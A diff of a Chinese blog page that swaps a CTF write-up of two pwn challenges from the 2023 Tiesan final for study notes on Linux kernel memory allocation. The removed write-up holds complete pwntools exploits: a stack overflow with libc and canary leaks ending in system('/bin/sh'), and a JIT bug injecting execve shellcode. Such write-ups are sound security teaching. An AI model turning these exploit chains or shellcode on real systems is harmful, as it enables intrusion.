@@ -4,9 +4,19 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2023铁人三项决赛, N1co5in3&#39;s Blog">
-    <meta name="description" content="铁三决赛pwn的难度不大，但是那道虚拟机漏洞类型还是挺新颖的，以后有空可以整理一下不同类型虚拟机漏洞的利用
-值得吐槽的是，我们实训课xjb装东西，竟然把我kali的pwntools和pwndbg全搞没了，比赛前半小时才发现（别问我为什么这么">
+    <meta name="keywords" content="2023921, N1co5in3&#39;s Blog">
+    <meta name="description" content="内存管理linux内核设计与实现第12章笔记
+1.页2.区对相似特性的页分组
+目的：某些硬件存在缺陷，无法寻址
+
+只能用特定内存DMA
+物理寻址范围大于虚拟寻址范围
+
+四种区
+
+ZONE_DMA
+ZONE_DMA32
+ZONE_NORMAL">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +28,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2023铁人三项决赛 | N1co5in3&#39;s Blog</title>
+    <title>2023921 | N1co5in3&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -311,12 +321,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/cover3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/cover4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2023铁人三项决赛</h1>
+                    <h1 class="description center-align post-title">2023921</h1>
                 </div>
             </div>
         </div>
@@ -340,23 +350,14 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/writeup/">
-                                <span class="chip bg-color">writeup</span>
+                            <a href="/tags/study-notes/">
+                                <span class="chip bg-color">study notes</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/pwn/" class="post-category">
-                                pwn
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -365,7 +366,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-28
+                    2023-09-21
                 </div>
                 
 
@@ -386,130 +387,150 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>铁三决赛pwn的难度不大，但是那道虚拟机漏洞类型还是挺新颖的，以后有空可以整理一下不同类型虚拟机漏洞的利用</p>
-<p>值得吐槽的是，我们实训课xjb装东西，竟然把我kali的pwntools和pwndbg全搞没了，比赛前半小时才发现（别问我为什么这么久没碰pwn)，害得我把kali恢复到了去年8月的快照</p>
-<h1 id="driverlicense"><a href="#driverlicense" class="headerlink" title="driverlicense"></a>driverlicense</h1><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>可以输入驾照的name, year, comment, name和comment以string形式存在栈上，year为数字</p>
-<p>后面可以修改comment，并show驾照的信息</p>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>edit comment的过程中，我们会获得comment string的cstr指针，然后用malloc_usable_size的方式获得当前长度，这个长度用于后续的输出</p>
-<p>但是cstr在字符串长的时候才是堆指针，<strong>字符串较短的时候会保存在栈上，此时malloc_usable_size不适用这种情况</strong>，我们可以获得一个很大的size</p>
-<p><img src="1.png" alt="get usable size"></p>
-<p>由于此时字符串在栈上，我们初步构思这是一个栈溢出</p>
-<p>接下来问题来了，怎么泄露libc和canary?</p>
-<p>出题者故意把name string放在了comment string后，我们就可以通过溢出控制name的cstr,由于没开pie，我们直接把cstr换成read的got地址，就泄露了libc</p>
-<p>如法炮制，有了libc就有了envrion，就可以通过偏移推测栈上的canary地址，泄露出来</p>
-<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
-context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
-
-<span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#io = process('./pwn')</span>
-io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.31.3.108'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
-libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'year'</span><span class="token punctuation">,</span> <span class="token string">'12'</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x401137')</span>
-payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602028</span><span class="token punctuation">)</span>
-edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-show<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>
-leak_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> b<span class="token string">'\0\0'</span><span class="token punctuation">)</span>
-lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>
-
-libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
-
-<span class="token comment" spellcheck="true">#leak stack </span>
-environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>
-
-payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
-edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-show<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>
-leak_stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> b<span class="token string">'\0\0'</span><span class="token punctuation">)</span>
-lg<span class="token punctuation">(</span><span class="token string">'leak_stack'</span><span class="token punctuation">,</span> leak_stack<span class="token punctuation">)</span>
-stack_addr <span class="token operator">=</span> leak_stack <span class="token operator">+</span> <span class="token number">0x7fffaca833c8</span> <span class="token operator">-</span> <span class="token number">0x7fffaca834d8</span>
-
-<span class="token comment" spellcheck="true">#leak canary</span>
-payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>
-edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-show<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>
-canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span>
-
-
-
-payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> b<span class="token string">'b'</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>
-payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x401713</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x401416')</span>
-<span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x40149d')</span>
-edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#gdb.attach(io)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><p>linux内核设计与实现第12章笔记</p>
+<h2 id="1-页"><a href="#1-页" class="headerlink" title="1.页"></a>1.页</h2><h2 id="2-区"><a href="#2-区" class="headerlink" title="2.区"></a>2.区</h2><p>对相似特性的页分组</p>
+<p>目的：某些硬件存在缺陷，无法寻址</p>
+<ul>
+<li>只能用特定内存DMA</li>
+<li>物理寻址范围大于虚拟寻址范围</li>
+</ul>
+<p>四种区</p>
+<ul>
+<li>ZONE_DMA</li>
+<li>ZONE_DMA32</li>
+<li>ZONE_NORMAL</li>
+<li>ZONE_HIGHEM：高端内存，页不能永久映射到内核地址</li>
+</ul>
+<p>不一定要定义所有区</p>
+<h2 id="3-获得页"><a href="#3-获得页" class="headerlink" title="3.获得页"></a>3.获得页</h2><p>底层接口&lt;linux/gfp.h&gt;，函数：</p>
+<p>struct pages *alloc_pages(gfp_mask, order)</p>
+<p>分配1&lt;&lt;order个连续的物理页，返回第一个页的struct结构体</p>
+<p>void * page_address(struct page *page)</p>
+<p>返回指针，指向给定物理页的逻辑地址</p>
+<p>unsigned long __get_free_pages(fgp_mask, order)</p>
+<p>与alloc_pages一样，返回第一个页的逻辑地址</p>
+<h2 id="获得填充为0的页"><a href="#获得填充为0的页" class="headerlink" title="获得填充为0的页"></a>获得填充为0的页</h2><p>unsigned long get_zeroed_page(gfp_mask)</p>
+<h2 id="释放页"><a href="#释放页" class="headerlink" title="释放页"></a>释放页</h2><p>8个页的使用与释放</p>
+<pre class=" language-c"><code class="language-c">page <span class="token operator">=</span> <span class="token function">__get_free_pages</span><span class="token punctuation">(</span>GFP_KERNEL<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* page指向逻辑地址 */</span>
+<span class="token function">free_pages</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
-<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>这题和南阳理工的师傅交流的过程中，发现他们因为找不到2.23对应的c++库，放弃了调试。如wp所示，我调试的过程中，是直接先用自己虚拟机的libc库怼成功了，然后直接改用给的2.23偏移打远程。这样暴力的方法有一个问题：就是不同libc库会导致environ栈地址和canary的偏移不同（stack_addr = leak_stack + 0x7fffaca833c8 - 0x7fffaca834d8这句），好在我远程的过程中试了几次就找到了2.23下的canary偏移，比较幸运</p>
-<p>当然，时间充足的情况下，肯定是能找到所有对应库本地调试，最严谨。</p>
-<h1 id="fast-emulator"><a href="#fast-emulator" class="headerlink" title="fast_emulator"></a>fast_emulator</h1><h3 id="题目复现-1"><a href="#题目复现-1" class="headerlink" title="题目复现"></a>题目复现</h3><p>程序实现了一个能实现load,add,sub,mul,div,xor指令的即时编译器，用户逐行输入指令， parse_line会把指令分析为args结构体，然后args结构体会被翻译为shellcode，全部输入后执行shellcode</p>
-<p><img src="2.png" alt="main process"></p>
-<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>说说我解题时的过程（基本是废话）</p>
-<p>我先把所有指令试了一遍，然后动调发现div指令实际的shellcode是loopne，我就考虑用loopne直接跳转到load的数据造成恶意执行。比如有一句’load r1, 0x12345678’，直接跳转到\x12\x34\x56\x78的地方</p>
-<p>然后我想让跳转执行的命令更长，就试了一下’load r1,0x1111111111’,然后动调发现，shellcode实际被翻译为’mov rax, 0x11111111’再加上\x11\x11</p>
-<p>也就是说，<strong>这个mov rax,(num)最多只能支持32位数，但解析的过程中可以拼接超过32位的数，超过的部分会变成下一行汇编执行</strong></p>
-<p>再静态分析，正是这个from_hex函数没有限制16进制数的大小</p>
-<p><img src="3.png" alt="from_hex"></p>
-<p>这样我们相当于可以直接用这个漏洞任意执行了，但还要注意，我们输入的每行指令有长度限制，因此网上扒的shellcode得分段</p>
-<p>具体大小端之类的麻烦问题直接看我wp</p>
-<h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
-
-<span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#io = process('./pwn')</span>
-io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.31.3.108'</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x1a16)')</span>
-<span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x16d5)')</span>
-payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-
-shellcode <span class="token operator">=</span> <span class="token string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</span>
-
-payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'f63148'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
-payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'68732f2f6e69622fbf4856'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
-payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'5f5457'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
-payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'050f99583b6a'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
-
-
-length <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'enter:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-
-
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<h2 id="4-kmalloc"><a href="#4-kmalloc" class="headerlink" title="4.kmalloc"></a>4.kmalloc</h2><p>void *kmalloc(size_t size, gfp_t flags)</p>
+<p>分配的内存区，物理上连续</p>
+<p>如果是NULL，需要处理错误</p>
+<p>调用成功，返回逻辑地址，内存块的大小至少为请求的大小</p>
+<h2 id="gfp-mask标志"><a href="#gfp-mask标志" class="headerlink" title="gfp_mask标志"></a>gfp_mask标志</h2><p>分为行为修饰符，区修饰符及类型</p>
+<ol>
+<li><p>行为修饰符</p>
+<p>描述分配器的具体特征</p>
+<p>例子</p>
+<pre><code>ptr = kmalloc(size, __GFP_WAIT|__GFP_IO|__GFP_FS);
 </code></pre>
-
+<p>可以阻塞，执行IO，必要时可以执行FS操作</p>
+</li>
+<li><p>区修饰符</p>
+<p>默认从ZONE_NORMAL分配</p>
+<p>不能给get_free_pages(),kmalloc()指定ZONE_HIGHMEM，因为不能返回固定的逻辑地址</p>
+</li>
+<li><p>类型标志</p>
+<p>指定所需的行为和区描述符（多个的复合）</p>
+<table>
+<thead>
+<tr>
+<th>标志</th>
+<th>修饰符标志</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GFP_KERNEL</td>
+<td>(__GFP_WAIT|__GFP_IO|__GFP_FS)</td>
+</tr>
+<tr>
+<td>GFP_ATOMIC</td>
+<td>__GFP_HIGH</td>
+</tr>
+<tr>
+<td>GFP_NOIO</td>
+<td>__GFP_WAIT</td>
+</tr>
+<tr>
+<td>GFP_NOFS</td>
+<td>__GFP_WAIT|__GFP_IO</td>
+</tr>
+</tbody></table>
+<p>GFP_KERNEL:可能睡眠，普通优先级,最常用</p>
+<p>可以用在可以重新安全调度的进程context</p>
+<p>GFP_ATOMIC: 不能干任何事，分配成功机会较小，适用于不能睡眠的情况（中断处理程序，软中断,tasklet）</p>
+<p>GFP_NOFS:用在FS代码中，如果没有用GFP_NOFS，会引起更多的文件系统操作，形成套娃，最后死锁</p>
+<p><strong>绝大多数代码中，要么GFP_KERNEL,要么GFP_ATOMIC</strong></p>
+</li>
+</ol>
+<h2 id="kfree"><a href="#kfree" class="headerlink" title="kfree()"></a>kfree()</h2><h2 id="5-vmalloc"><a href="#5-vmalloc" class="headerlink" title="5.vmalloc()"></a>5.vmalloc()</h2><p>类似kmalloc()，前者的虚拟地址连续，物理地址不需要连续</p>
+<p>大多数情况，只有硬件设备需要物理地址连续的设备</p>
+<p>kmalloc有更好的性能，因此vmalloc不得已才会使用-》获得大段内存</p>
+<p>例如模块被动态插入到内核中</p>
+<p>用法与用户空间一样：void *vmalloc(unsigned long size)</p>
+<p>void vfree(const void*addr)</p>
+<p>这个函数可以睡眠，没有返回值</p>
+<h2 id="6-slab层"><a href="#6-slab层" class="headerlink" title="6.slab层"></a>6.slab层</h2><p>空闲链表：相当于对象高速缓存</p>
+<p>slab扮演通用数据结构缓存层的角色</p>
+<h3 id="设计思想"><a href="#设计思想" class="headerlink" title="设计思想"></a>设计思想</h3><p>不同的对象划分为高速缓存组，每种对象对应一个高速缓存</p>
+<p>kmalloc建立在slab层上，使用一组cache</p>
+<p>slab：一个多个物理上连续的页组成，一般情况下仅仅一页</p>
+<p>把用的，不用的对象组织起来</p>
+<p>例子：inode用slab管理, struct inode用inode_cachep高速缓存</p>
+<p>每个高速缓存用kmem_cache结构表示，包含三个链表：slabs_full,partial,empty</p>
+<p>每个slab用slab描述符 struct slab表示</p>
+<pre><code>struct slab &#123;
+    struct list_head list;
+    unsigned long colouroff; //着色的偏移量
+    void *s_mem; //第一个对象
+    unsigned inuse; //已分配的对象
+    kmem_bufctl_t free; //第一个空闲对象
+&#125;;
+</code></pre>
+<p>slab描述符：要么在slab外另行分配，要么在slab自身开始的地方。</p>
+<p>slab为高速缓存创建新的slab，通过__get_free_pages()</p>
+<pre><code>void *kmem_getpages(struct kmem_cahce *cachep, gfp_t flags, int nodeid)
+</code></pre>
+<p>nodeid:用于NUMA系统，提供较好性能</p>
+<p>返回一个slab大小的空页</p>
+<p>slab层的管理：在每个高速缓存的基础上，给整个内核一个简单的接口完成</p>
+<p>通过接口，创建撤销新的高速缓存</p>
+<h3 id="slab分配器的接口"><a href="#slab分配器的接口" class="headerlink" title="slab分配器的接口"></a>slab分配器的接口</h3><p>高速缓存的创建</p>
+<pre><code>struct kmem_cache * kmem_cache_create(const char *name, size_t size, size_t align, unsigned long flags, void (*ctor) (void*));
+</code></pre>
+<p>flags:</p>
+<ul>
+<li>SLAB_HWCACHE_ALIGN:所有对象，行对齐，防止错误的共享</li>
+<li>SLAB_POISON:用a5a5a5a5填充slab</li>
+<li>SLAB_RED_ZONE：红色警戒区，检测缓冲越界</li>
+<li>SLAB_CACHE_DMA：用于DMA</li>
+</ul>
+<p>ctor:构造函数，linux不需要</p>
+<p>不能在中断context中使用-&gt;可能睡眠</p>
+<p>高速缓存的撤销</p>
+<pre><code>int kmem_cache_destroy(struct kmem_cache *cachep)
+</code></pre>
+<p>调用条件：</p>
+<ul>
+<li><p>所有slab为空，不能被分配</p>
+</li>
+<li><p>调用destroy过程中不再访问这个高速缓存</p>
+</li>
+</ul>
+<h3 id="1-从缓存中分配"><a href="#1-从缓存中分配" class="headerlink" title="1.从缓存中分配"></a>1.从缓存中分配</h3><p>创建cachep后可从下面函数获取对象：</p>
+<pre><code>void * kmem_cache_alloc(struct kmem_cache *cachep, gfp_t flags)
+</code></pre>
+<p>从指定的cachep获得一个指向对象的指针</p>
+<p>flags:针对cachep没有空闲对象时， getpages的情况</p>
+<p>释放对象</p>
+<pre><code>void * kmem_cache_free(struct kmem_cache *cachep, void *objp)
+</code></pre>
+<h3 id="2-task-struct使用实例"><a href="#2-task-struct使用实例" class="headerlink" title="2.task_struct使用实例"></a>2.task_struct使用实例</h3>
                 
             </div>
             <hr/>
@@ -535,7 +556,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://N1co3tine.github.io/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/">http://N1co3tine.github.io/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/</a>
+                    <a href="http://N1co3tine.github.io/2023/09/21/2023-9-21/">http://N1co3tine.github.io/2023/09/21/2023-9-21/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -573,8 +594,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/writeup/">
-                                    <span class="chip bg-color">writeup</span>
+                                <a href="/tags/study-notes/">
+                                    <span class="chip bg-color">study notes</span>
                                 </a>
                             
                         </div>
@@ -620,9 +641,10 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2023/09/21/2023-9-21/">
                     <div class="card-image">
@@ -639,9 +661,9 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-09-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -650,6 +672,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -668,12 +691,12 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/12/16/game%E9%9D%9E%E9%A2%84%E6%9C%9F/">
+                <a href="/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/">
                     <div class="card-image">
                         
-                        <img src="/images/cover2.jpg" class="responsive-img" alt="game非预期">
+                        <img src="/images/cover3.jpg" class="responsive-img" alt="2023铁人三项决赛">
                         
-                        <span class="card-title">game非预期</span>
+                        <span class="card-title">2023铁人三项决赛</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -684,7 +707,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-28
                             </span>
                         <span class="publish-author">
                             
@@ -701,8 +724,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/study/">
-                        <span class="chip bg-color">study</span>
+                    <a href="/tags/writeup/">
+                        <span class="chip bg-color">writeup</span>
                     </a>
                     
                 </div>
